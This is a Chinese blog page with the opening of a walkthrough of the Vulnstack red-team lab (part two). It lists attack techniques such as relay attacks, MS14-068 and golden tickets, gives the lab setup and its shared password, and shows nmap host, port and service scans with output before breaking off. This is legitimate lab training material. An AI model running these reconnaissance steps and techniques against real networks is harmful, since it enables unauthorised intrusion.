<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/c16f7e2b105eef61.css" as="style"/><link rel="stylesheet" href="/_next/static/css/c16f7e2b105eef61.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-4b638ff538b97055.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-81a2b7b9623e52f7.js" defer=""></script><script src="/_next/static/TQkCFKbomQ5ZAXR97drm1/_buildManifest.js" defer=""></script><script src="/_next/static/TQkCFKbomQ5ZAXR97drm1/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"Vulnstack红队评估实战靶场(二)","contentHtml":"\u003ch1\u003eATT\u0026#x26;CK红队评估实战靶场(二)\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"http://vulnstack.qiyuanxuetang.net/vuln/?page=2\"\u003ehttp://vulnstack.qiyuanxuetang.net/vuln/?page=2\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e描述：红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据/白银票据/Sid History/MOF等攻防技术。关于靶场统一登录密码：\u003ccode\u003e1qaz@WSX\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e（雾。。好多没听过的）\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBypass UAC\u003c/li\u003e\n\u003cli\u003eWindows系统NTLM获取（理论知识：Windows认证）\u003c/li\u003e\n\u003cli\u003eAccess Token利用（MSSQL利用）\u003c/li\u003e\n\u003cli\u003eWMI利用\u003c/li\u003e\n\u003cli\u003e网页代理，二层代理，特殊协议代理（DNS，ICMP）\u003c/li\u003e\n\u003cli\u003e域内信息收集\u003c/li\u003e\n\u003cli\u003e域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用\u003c/li\u003e\n\u003cli\u003e域凭证收集\u003c/li\u003e\n\u003cli\u003e后门技术（黄金票据/白银票据/Sid History/MOF）\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e靶场搭建\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e网络配置信息，已经默认配置好，直接将网卡设置好即可\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDC\u003c/strong\u003e \u003ccode\u003eIP\u003c/code\u003e：10.10.10.10 \u003ccode\u003eOS\u003c/code\u003e：Windows 2012(64) \u003ccode\u003e应用\u003c/code\u003e：AD域\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWEB\u003c/strong\u003e \u003ccode\u003eIP1\u003c/code\u003e：10.10.10.80 \u003ccode\u003eIP2\u003c/code\u003e：192.168.111.80 \u003ccode\u003eOS\u003c/code\u003e：Windows 2008(64) \u003ccode\u003e应用\u003c/code\u003e：Weblogic 10.3.6 MSSQL 2008\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePC\u003c/strong\u003e  \u003ccode\u003eIP1\u003c/code\u003e：10.10.10.201 \u003ccode\u003eIP2\u003c/code\u003e：192.168.111.201 \u003ccode\u003eOS\u003c/code\u003e：Windows 7(32)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eKALI\u003c/strong\u003e \u003ccode\u003eIP\u003c/code\u003e ：192.168.111.150\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e网卡设置\u003c/p\u003e\n\u003cp\u003eNAT网卡网段改为\u003ccode\u003e192.168.111.0\u003c/code\u003e ,仅主机模式网卡网段改为\u003ccode\u003e10.10.10.0\u003c/code\u003e ；\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWEB主机默认账户是登陆不进去的，需要切换为\u003ccode\u003ede1ay\u003c/code\u003e账户登陆进去\u003c/p\u003e\n\u003cp\u003e然后来到 \u003ccode\u003eC:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\bin\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e依次使用管理员模式打开 \u003ccode\u003eset domainenv\u003c/code\u003e \u003ccode\u003estartmanagerweblogic\u003c/code\u003e \u003ccode\u003estartweblogic\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e访问\u003ccode\u003ehttp://192.168.111.80:7001/console\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003e开始渗透\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用nmap扫描网段类存活主机\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eKali\u003c/code\u003e的\u003ccode\u003eip\u003c/code\u003e是\u003ccode\u003e150\u003c/code\u003e ，那么目标就是\u003ccode\u003e80\u003c/code\u003e以及\u003ccode\u003e201\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e                   \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-16 15:39 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00051\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:C0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00035\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:FB:CA:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.80\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00024\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:AC:FA:\u003cspan class=\"hljs-title function_ invoke__\"\u003eFB\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.201\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00033\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:AD:EE:\u003cspan class=\"hljs-title function_ invoke__\"\u003eB7\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.254\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00038\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:E6:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eE:\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e (VMware)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.150\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 192.168.111.80\u003c/span\u003e\nnmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.80\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-16 15:42 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.80\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.043\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65521\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response)\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp    open  http\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp   open  msrpc\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp   open  netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp   open  microsoft-ds\n\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e/tcp  open  ms-sql-s\n\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e/tcp  open  ms-wbt-server\n\u003cspan class=\"hljs-number\"\u003e7001\u003c/span\u003e/tcp  open  afs3-callback\n\u003cspan class=\"hljs-number\"\u003e49152\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49153\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49154\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49155\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49156\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e55068\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e60966\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-comment\"\u003e# 192.168.111.201\u003c/span\u003e\nnmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.201\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-16 15:44 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.201\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.044\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65525\u003c/span\u003e filtered tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (no-response)\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp   open  msrpc\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp   open  netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp   open  microsoft-ds\n\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e/tcp  open  ms-wbt-server\n\u003cspan class=\"hljs-number\"\u003e49152\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49153\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49154\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49155\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e49156\u003c/span\u003e/tcp open  unknown\n\u003cspan class=\"hljs-number\"\u003e60518\u003c/span\u003e/tcp open  unknown\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:AD:EE:\u003cspan class=\"hljs-title function_ invoke__\"\u003eB7\u003c/span\u003e (VMware)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e192.168.111.80\u003c/code\u003e存在\u003ccode\u003eweb\u003c/code\u003e端口，所以是我们的优先目标\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e7001\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.80\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-16 15:57 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e111.80\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.0010\u003c/span\u003es latency).\n\nPORT     STATE SERVICE        VERSION\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http           Microsoft IIS httpd \u003cspan class=\"hljs-number\"\u003e7.5\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp  open  msrpc          Microsoft Windows RPC\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp  open  microsoft-ds   Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 - \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e microsoft-ds\n\u003cspan class=\"hljs-number\"\u003e1433\u003c/span\u003e/tcp open  ms-sql-s       Microsoft SQL Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 \u003cspan class=\"hljs-number\"\u003e10.50\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e4000\u003c/span\u003e; SP2\n\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e/tcp open  ms-wbt-server?\n\u003cspan class=\"hljs-number\"\u003e7001\u003c/span\u003e/tcp open  http           Oracle WebLogic Server \u003cspan class=\"hljs-number\"\u003e10.3\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e6.0\u003c/span\u003e (Servlet \u003cspan class=\"hljs-number\"\u003e2.5\u003c/span\u003e; JSP \u003cspan class=\"hljs-number\"\u003e2.1\u003c/span\u003e; T3 enabled)\n\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org/cgi-bin/submit.cgi?new-service :\u003c/span\u003e\nSF-Port3389-TCP:V=\u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN%I=\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e%D=\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e%Time=\u003cspan class=\"hljs-number\"\u003e67385090\u003c/span\u003e%P=x86_64-pc-linux-gnu%\nSF:\u003cspan class=\"hljs-title function_ invoke__\"\u003er\u003c/span\u003e(TerminalServerCookie,\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e\"\\x03\\0\\0\\x13\\x0e\\xd0\\0\\0\\x124\\0\\x02\\x01\\x08\\\nSF:0\\x02\\0\\0\\0\"\u003c/span\u003e);\nMAC Address: \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eC:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:AC:FA:\u003cspan class=\"hljs-title function_ invoke__\"\u003eFB\u003c/span\u003e (VMware)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: phone|specialized|general purpose\n\u003cspan class=\"hljs-title function_ invoke__\"\u003eRunning\u003c/span\u003e (JUST GUESSING): Microsoft Windows Phone|\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e|\u003cspan class=\"hljs-title function_ invoke__\"\u003eVista\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%)\nOS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e:r1 cpe:/o:microsoft:windows_server_2008::\u003cspan class=\"hljs-variable constant_\"\u003ebeta3\u003c/span\u003e cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::\u003cspan class=\"hljs-variable constant_\"\u003esp1\u003c/span\u003e cpe:/o:microsoft:windows_8\nAggressive OS guesses: Microsoft Windows Phone \u003cspan class=\"hljs-number\"\u003e7.5\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e8.0\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003e%), Microsoft Windows Embedded Standard \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e93\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003eR1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e92\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e91\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e Beta \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e%), Microsoft Windows Vista SP0 \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e SP1, Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e SP1, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e%), Microsoft Windows Vista SP2, Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e SP1, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e90\u003c/span\u003e%), Microsoft Windows \u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e Professional \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e Windows \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e89\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 \u003cspan class=\"hljs-title function_ invoke__\"\u003eSP1\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ehost\u003c/span\u003e (test conditions non-ideal).\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OSs: Windows, Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 - \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e; CPE: cpe:/o:microsoft:windows\nOS \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e Service detection performed. Please report any incorrect results at https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org/submit/ .\u003c/span\u003e\nNmap done: \u003cspan 